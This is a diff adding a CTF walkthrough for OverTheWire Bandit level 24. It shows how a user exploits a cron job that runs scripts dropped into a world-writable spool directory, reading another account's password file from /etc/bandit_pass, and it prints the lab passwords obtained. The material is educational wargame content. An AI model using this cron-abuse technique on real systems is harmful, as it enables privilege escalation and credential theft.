@@ -181,3 +181,79 @@ bandit22@bandit:/etc/cron.d$
 > **Password:** jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 ---
+
+## Bandit 24
+
+[http://overthewire.org/wargames/bandit/bandit24.html](http://overthewire.org/wargames/bandit/bandit24.html)
+
+A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+
+**NOTE**: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**NOTE 2**: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+More cron stuff, let's see what the script does:
+
+```console
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+So it navigates to `/var/spool/bandit24` directory and executes all scripts as bandit24. Alright, so we need to make our script that writes the contents of `/etc/bandit_pass/bandit24` somewhere. 
+
+Make sure you give the script and the folder the correct permissions.
+
+```console
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/bd2324
+bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/bd2324
+bandit23@bandit:/etc/cron.d$ cd /tmp/bd2324
+bandit23@bandit:/tmp/bd2324$ cat > myscript2324.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bd2324/password
+^C
+bandit23@bandit:/tmp/bd2324$ chmod 777 myscript2324.sh
+```
+
+Okay now that we've create the script and gave it all the proper permissions...we just need to copy that script to correct path contained within the `cronjob_bandit24.sh` script.
+```console
+bandit23@bandit:/tmp/bd2324$ cp myscript2324.sh /var/spool/bandit24/
+```
+
+Now we wait for cron to execute the script. 
+
+**Pro TIP**: If you don't want to type ls a gazillion times waiting for the file to appear use `watch -n 1 -x ls /tmp/bd2324`. Watch essentially repeats the `ls` command at our directory every 1 second. 
+
+```console
+bandit23@bandit:/tmp/bd2324$ ls -al /var/spool/bandit24/
+total 153
+drwxrwxrwx 2 bandit24 bandit23 151552 Oct 21 23:08 .
+drwxr-xr-x 6 root   root    4096 May 3 2015 ..
+bandit23@bandit:/tmp/bd2324$ ls
+password myscript2324.sh
+bandit23@bandit:/tmp/bd2324$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+Script got deleted, which means cron executed it and we got our password!
+
+> **Username:** bandit24
+> **Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+---
